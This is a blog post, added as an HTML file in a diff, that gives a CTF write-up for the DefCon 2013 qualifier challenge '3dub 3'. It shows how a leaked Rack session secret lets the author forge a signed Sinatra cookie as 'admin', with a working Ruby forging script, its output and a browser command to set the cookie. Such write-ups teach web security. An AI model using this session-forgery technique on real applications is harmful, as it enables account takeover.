@@ -1,0 +1,456 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>DefCon CTF Qualifier 2013 3dub 3 Write Up - xelz's blog</title>
+	<meta name="author" content="xelz">
+
+	
+	<meta name="description" content="mirror of http://www.blue-lotus.net/def-con-ctf-qualifier-2013-3dub-3-writeup/ First of all, we got a secrets link and log in or create user form. &hellip;">
+	
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+	<link href="/atom.xml" rel="alternate" title="xelz's blog" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+    <script src="/javascripts/jquery.min.js"></script>
+    
+</head>
+
+
+<body>
+	<header id="header" class="inner"><h1><a href="/">xelz's blog</a></h1>
+<nav id="main-nav"><ul class="main">
+	<li><a href="/">Blog</a></li>
+	<li><a href="/blog/archives">Archives</a></li>
+</ul>
+</nav>
+<nav id="mobile-nav">
+	<div class="alignleft menu">
+		<a class="button">Menu</a>
+		<div class="container"><ul class="main">
+	<li><a href="/">Blog</a></li>
+	<li><a href="/blog/archives">Archives</a></li>
+</ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="https://www.google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:xelz.info">
+			</form>
+		</div>
+	</div>
+</nav>
+<nav id="sub-nav" class="alignright">
+	<div class="social">
+		
+		
+		
+		
+		<a class="github" href="https://github.com/xelzmm" title="GitHub">GitHub</a>
+		
+    
+		
+		
+		
+		
+		
+		<a class="rss" href="/atom.xml" title="RSS">RSS</a>
+		
+    
+	</div>
+	<form class="search" action="https://www.google.com/search" method="get">
+		<input class="alignright" type="text" name="q" results="0">
+		<input type="hidden" name="q" value="site:xelz.info">
+	</form>
+</nav>
+
+</header>
+	
+		
+	
+	<div id="content" class="inner"><article class="post">
+	<h2 class="title">DefCon CTF Qualifier 2013 3dub 3 Write Up</h2>
+	<div class="entry-content"><p>mirror of <a href="http://www.blue-lotus.net/def-con-ctf-qualifier-2013-3dub-3-writeup/">http://www.blue-lotus.net/def-con-ctf-qualifier-2013-3dub-3-writeup/</a></p>
+
+<p>First of all, we got a <code>secrets</code> link and <code>log in or create user</code> form. When we create and login, the website redirect us to the &lsquo;secrets&rsquo; page like this</p>
+
+<blockquote><p>Secrets</p>
+
+<p>name owner actions</p>
+
+<p>key admin <a href="#">show</a></p>
+
+<p>nothing asdf <a href="#">show</a></p>
+
+<p><a href="#">new secret</a></p></blockquote>
+
+<p>we&rsquo;ve got some links to see secrets owned by other users, include the <code>admin</code>, or easily add a new secret ourselves.</p>
+
+<p>Having a try to open the admin&rsquo;s secret, we got a 500 Error Page with some error stack, which powered by the Ruby framework <code>Sinatra</code>.</p>
+
+<p>From the very first sight of the page, it said <code>unauthorized</code> as the error message and a piece of source code was provided</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">redirect</span> <span class="s1">&#39;/secrets&#39;</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">get</span> <span class="s1">&#39;/secrets/:id&#39;</span> <span class="k">do</span>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">SECRETS</span><span class="o">[</span><span class="n">params</span><span class="o">[</span><span class="ss">:id</span><span class="o">].</span><span class="n">to_i</span><span class="o">]</span>
+</span><span class='line'><span class="k">raise</span> <span class="s2">&quot;unauthorized&quot;</span> <span class="k">if</span> <span class="n">session</span><span class="o">[</span><span class="ss">:user_name</span><span class="o">]</span> <span class="o">!=</span> <span class="n">s</span><span class="o">.</span><span class="n">username</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">haml</span> <span class="ss">:secret</span><span class="p">,</span> <span class="ss">locals</span><span class="p">:</span> <span class="p">{</span><span class="ss">secret</span><span class="p">:</span> <span class="n">s</span><span class="p">}</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">helpers</span> <span class="k">do</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">current_user</span>
+</span><span class='line'>    <span class="k">return</span> <span class="kp">nil</span> <span class="k">unless</span> <span class="n">session</span><span class="o">[</span><span class="ss">:user_name</span><span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<!-- more -->
+
+
+<p>It meant that I&rsquo;m not the secret&rsquo;s holder. then have a look at the whole page, and you would find some environment variable in the <code>Rack ENV</code> section, partly like</p>
+
+<ul>
+<li>rack.session</li>
+</ul>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span><span class="s2">&quot;session_id&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a&quot;</span><span class="p">,</span> <span class="s2">&quot;tracking&quot;</span><span class="o">=&gt;</span><span class="p">{</span><span class="s2">&quot;HTTP_USER_AGENT&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb&quot;</span><span class="p">,</span> <span class="s2">&quot;HTTP_ACCEPT_ENCODING&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;ed2b3ca90a4e723402367a1d17c8b28392842398&quot;</span><span class="p">,</span> <span class="s2">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6&quot;</span><span class="p">},</span> <span class="s2">&quot;csrf&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6&quot;</span><span class="p">,</span> <span class="s2">&quot;user_name&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;test&quot;</span><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>rack.session.options</li>
+</ul>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span><span class="ss">:path</span><span class="o">=&gt;</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="ss">:domain</span><span class="o">=&gt;</span><span class="kp">nil</span><span class="p">,</span> <span class="ss">:expire_after</span><span class="o">=&gt;</span><span class="kp">nil</span><span class="p">,</span> <span class="ss">:secure</span><span class="o">=&gt;</span><span class="kp">false</span><span class="p">,</span> <span class="ss">:httponly</span><span class="o">=&gt;</span><span class="kp">true</span><span class="p">,</span> <span class="ss">:defer</span><span class="o">=&gt;</span><span class="kp">false</span><span class="p">,</span> <span class="ss">:renew</span><span class="o">=&gt;</span><span class="kp">false</span><span class="p">,</span> <span class="ss">:sidbits</span><span class="o">=&gt;</span><span class="mi">128</span><span class="p">,</span> <span class="ss">:secure_random</span><span class="o">=&gt;</span><span class="no">SecureRandom</span><span class="p">,</span> <span class="ss">:secret</span><span class="o">=&gt;</span><span class="s2">&quot;wroashsoxDiculReejLykUssyifabEdGhovHabno&quot;</span><span class="p">,</span> <span class="ss">:coder</span><span class="o">=&gt;</span><span class="c1">#}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>rack.session.unpacked_cookie_data</li>
+</ul>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span><span class="s2">&quot;session_id&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a&quot;</span><span class="p">,</span> <span class="s2">&quot;tracking&quot;</span><span class="o">=&gt;</span><span class="p">{</span><span class="s2">&quot;HTTP_USER_AGENT&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb&quot;</span><span class="p">,</span> <span class="s2">&quot;HTTP_ACCEPT_ENCODING&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;ed2b3ca90a4e723402367a1d17c8b28392842398&quot;</span><span class="p">,</span> <span class="s2">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6&quot;</span><span class="p">},</span> <span class="s2">&quot;csrf&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6&quot;</span><span class="p">,</span> <span class="s2">&quot;user_name&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;test&quot;</span><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>rack.request.cookie_hash</li>
+</ul>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span><span class="s2">&quot;rack.session&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj</span><span class="se">\n</span><span class="s2">YjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki</span><span class="se">\n</span><span class="s2">DXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm</span><span class="se">\n</span><span class="s2">OWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND</span><span class="se">\n</span><span class="s2">RVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj</span><span class="se">\n</span><span class="s2">OGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0</span><span class="se">\n</span><span class="s2">YWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG</span><span class="se">\n</span><span class="s2">OwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx</span><span class="se">\n</span><span class="s2">YWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl</span><span class="se">\n</span><span class="s2">c3QGOwBU</span><span class="se">\n</span><span class="s2">--d637305e23d6693f3ebe276b292293c7ff0b72e6&quot;</span><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>we&rsquo;ve got some message:</p>
+
+<p>the cookie <code>rack.session</code> is some way encoded of <code>rack.session.unpacked_cookie_data</code>, which is totally the same as env variable rack.session, and the coder mybe <code>Rack::Session::Cookie::Base64::Marshal</code>, secret (if any) maybe <code>wroashsoxDiculReejLykUssyifabEdGhovHabno</code></p>
+
+<p>By seeking the source code of rack, we found this <a href="https://github.com/rack/rack/blob/master/lib/rack/session/cookie.rb">https://github.com/rack/</a></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="vi">@secrets</span> <span class="o">=</span> <span class="n">options</span><span class="o">.</span><span class="n">values_at</span><span class="p">(</span><span class="ss">:secret</span><span class="p">,</span> <span class="ss">:_old_secret</span><span class="p">)</span><span class="o">.</span><span class="n">compact</span>
+</span><span class='line'><span class="c1"># some code else</span>
+</span><span class='line'><span class="n">session_data</span> <span class="o">=</span> <span class="n">coder</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">session</span><span class="p">)</span>
+</span><span class='line'><span class="k">if</span> <span class="vi">@secrets</span><span class="o">.</span><span class="n">first</span>
+</span><span class='line'>    <span class="n">session_data</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;--</span><span class="si">#{</span><span class="n">generate_hmac</span><span class="p">(</span><span class="n">session_data</span><span class="p">,</span> <span class="vi">@secrets</span><span class="o">.</span><span class="n">first</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'><span class="c1"># some code else</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">generate_hmac</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">secret</span><span class="p">)</span>
+</span><span class='line'>    <span class="no">OpenSSL</span><span class="o">::</span><span class="no">HMAC</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(</span><span class="no">OpenSSL</span><span class="o">::</span><span class="no">Digest</span><span class="o">::</span><span class="no">SHA1</span><span class="o">.</span><span class="n">new</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span><span class='line'><span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Once the server received a request, it would confirm the validation of the cookie, reset the session if digest mismatch</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">if</span> <span class="vi">@secrets</span><span class="o">.</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">session_data</span>
+</span><span class='line'>    <span class="n">session_data</span><span class="p">,</span> <span class="n">digest</span> <span class="o">=</span> <span class="n">session_data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;--&quot;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">session_data</span> <span class="o">=</span> <span class="kp">nil</span> <span class="k">unless</span> <span class="n">digest_match?</span><span class="p">(</span><span class="n">session_data</span><span class="p">,</span> <span class="n">digest</span><span class="p">)</span>
+</span><span class='line'><span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Meanwhile, we knew the whole process of the session checking. thus, I&rsquo;ve wrote a ruby script to figure out this stuff with this way</p>
+
+<ul>
+<li><code>unpack(decode)</code> the cookie to origin session data</li>
+<li>modify session_data.user_name to <code>admin</code></li>
+<li><code>repack(encode)</code> the session data to cookie string format</li>
+<li>calculate a new digest of the session data then build the cookie</li>
+</ul>
+
+
+<h3>code</h3>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/ruby</span>
+</span><span class='line'><span class="c1">#Author: xelz@blue-lotus</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;openssl&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># part of rack/lib/rack/session/cookie.rb</span>
+</span><span class='line'><span class="k">class</span> <span class="nc">Base64</span>
+</span><span class='line'>    <span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
+</span><span class='line'>        <span class="o">[</span><span class="n">str</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">str</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
+</span><span class='line'>    <span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1"># Encode session cookies as Marshaled Base64 data</span>
+</span><span class='line'>    <span class="k">class</span> <span class="nc">Marshal</span> <span class="o">&lt;</span> <span class="no">Base64</span>
+</span><span class='line'>        <span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
+</span><span class='line'>            <span class="k">super</span><span class="p">(</span><span class="o">::</span><span class="no">Marshal</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">str</span><span class="p">))</span>
+</span><span class='line'>        <span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
+</span><span class='line'>            <span class="k">return</span> <span class="k">unless</span> <span class="n">str</span>
+</span><span class='line'>            <span class="o">::</span><span class="no">Marshal</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="k">super</span><span class="p">(</span><span class="n">str</span><span class="p">))</span> <span class="k">rescue</span> <span class="kp">nil</span>
+</span><span class='line'>        <span class="k">end</span>
+</span><span class='line'>    <span class="k">end</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">generate_hmac</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">secret</span><span class="p">)</span>
+</span><span class='line'>    <span class="no">OpenSSL</span><span class="o">::</span><span class="no">HMAC</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(</span><span class="no">OpenSSL</span><span class="o">::</span><span class="no">Digest</span><span class="o">::</span><span class="no">SHA1</span><span class="o">.</span><span class="n">new</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">exit</span><span class="p">()</span> <span class="k">unless</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;--&#39;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
+</span><span class='line'><span class="c1"># puts &#39;data is:&#39;</span>
+</span><span class='line'><span class="c1"># puts data, &quot;\n&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">coder</span> <span class="o">=</span> <span class="no">Base64</span><span class="o">::</span><span class="no">Marshal</span><span class="o">.</span><span class="n">new</span>
+</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">coder</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span><span class='line'><span class="n">data</span><span class="o">[</span><span class="s1">&#39;user_name&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s2">&quot;admin&quot;</span>
+</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">coder</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span><span class='line'><span class="c1"># puts &#39;modified data is:&#39;</span>
+</span><span class='line'><span class="c1"># puts data, &quot;\n&quot;</span>
+</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">data</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">secret</span> <span class="o">=</span> <span class="s1">&#39;wroashsoxDiculReejLykUssyifabEdGhovHabno&#39;</span>
+</span><span class='line'><span class="c1"># puts &#39;new digest string is:&#39;</span>
+</span><span class='line'><span class="n">digest</span> <span class="o">=</span> <span class="n">generate_hmac</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">secret</span><span class="p">)</span>
+</span><span class='line'><span class="c1"># puts digest, &quot;\n&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">puts</span> <span class="s1">&#39;cookie is&#39;</span>
+</span><span class='line'><span class="n">cookie</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">gsub</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;%0A&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;--&#39;</span> <span class="o">+</span> <span class="n">digest</span>
+</span><span class='line'><span class="nb">puts</span> <span class="n">cookie</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>run the script like this:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>xelz@blue-lotus:defconctf<span class="nv">$echo</span> -en <span class="s1">&#39;BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj\nYjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki\nDXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm\nOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND\nRVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj\nOGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0\nYWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG\nOwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx\nYWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl\nc3QGOwBU\n&#39;</span> <span class="p">|</span> awk <span class="s1">&#39;{print $1&quot;\\&quot;}&#39;</span> <span class="p">|</span> xargs ./hypeman.rb
+</span><span class='line'>cookie is
+</span><span class='line'>BAh7CSINdHJhY2tpbmd7CCIZSFRUUF9BQ0NFUFRfRU5DT0RJTkciLWVkMmIz%0AY2E5MGE0ZTcyMzQwMjM2N2ExZDE3YzhiMjgzOTI4NDIzOTgiFEhUVFBfVVNF%0AUl9BR0VOVCItOWMxZjdmOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlk%0ANDhiYiIZSFRUUF9BQ0NFUFRfTEFOR1VBR0UiLWNhNGFlZTBlODEyMTRhZGRj%0ANWZiMTI4NzdjZjllNWM4YjhiZWI3ZDYiCWNzcmYiRTVmNmQ4NWI3ZTFiMGE0%0AOGM4YTg3ZTQyODAzYWMxNjZjZjdkNjAxMjFhZmQyNGJhOTM3YmY2NWZhNGY4%0AOTg5YzYiD3Nlc3Npb25faWQiRTM1M2M2NjUyNWEwMWZhMGIzODU2Y2I5ZjM0%0AYWFlMmFhOWEzNmFkNGNkZTAyZGFlYTBjY2ZiYWY1NjZkZGJiNWEiDnVzZXJf%0AbmFtZSIKYWRtaW4<span class="o">=</span>%0A--4bd0a545e155460f804aff9df3e80e20fdffa07f
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>then modify the cookie with the new value, using any tool you like such as Firebug(for Firefox), WebInspector(for Webkit Based Browser), Fiddler(under IE7), Burpsuite(Java Based for any platform), I&rsquo;d like to use the Javascript Console in Chrome:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">=</span><span class="s1">&#39;rack.session=xxx;&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>refresh the page, and enjoy :)</p>
+
+<h3>key</h3>
+
+<blockquote><p>watch out for this Etdeksogav</p></blockquote>
+</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-06-28T20:00:00+08:00" pubdate data-updated="true">2013-06-28</time></div>
+	
+
+
+	
+	<div class="comments"><a href="#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+		
+		
+		<a class="addthis_button_tweet"></a>
+		
+		
+		
+	</div>
+	
+</div>
+
+
+
+<section id="comment">
+    <h2 class="title">Comments</h2>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+</div>
+	<footer id="footer" class="inner">Copyright &copy; 2014
+
+    xelz
+
+</footer>
+	<script src="/javascripts/slash.js"></script>
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'xelz';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://xelz.info/blog/2013/06/28/defcon-ctf-qualifier-2013-3dub-3-write-up/';
+        var disqus_url = 'http://xelz.info/blog/2013/06/28/defcon-ctf-qualifier-2013-3dub-3-write-up/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//go.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-41665464-1']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+
+
+
+
+</body>
+</html>
